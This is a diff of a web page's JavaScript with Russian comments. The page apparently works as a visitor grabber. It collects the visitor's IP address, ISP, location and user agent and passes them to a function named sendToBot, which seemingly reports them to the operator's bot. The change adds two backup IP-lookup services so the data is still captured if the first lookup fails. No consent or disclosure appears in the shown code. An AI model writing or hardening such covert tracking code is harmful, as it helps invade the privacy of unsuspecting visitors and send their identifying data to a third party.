@@ -29,7 +29,7 @@
                 .catch(() => {});
         }
 
-        // === 1. IP + ПРОВАЙДЕР + ГОРОД ===
+        // === 1. IP + ПРОВАЙДЕР (С РЕЗЕРВАМИ) ===
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
@@ -57,11 +57,15 @@
                 sendToBot(info);
             })
             .catch(() => {
-                // Если ipapi не сработал — берём базовый IP
                 fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
-                    .then(data => sendToBot('🌐 IP: ' + data.ip + '\n📱 ' + navigator.userAgent))
-                    .catch(() => sendToBot('❌ Ошибка IP'));
+                    .then(data => sendToBot('IP (резерв): ' + data.ip + '\n📱 ' + navigator.userAgent))
+                    .catch(() => {
+                        fetch('https://ipwho.is/')
+                            .then(res => res.json())
+                            .then(data => sendToBot('IP (резерв 2): ' + data.ip + '\n📱 ' + navigator.userAgent))
+                            .catch(() => sendToBot('❌ IP не определён'));
+                    });
             });
 
         // === 2. БАТАРЕЯ ===
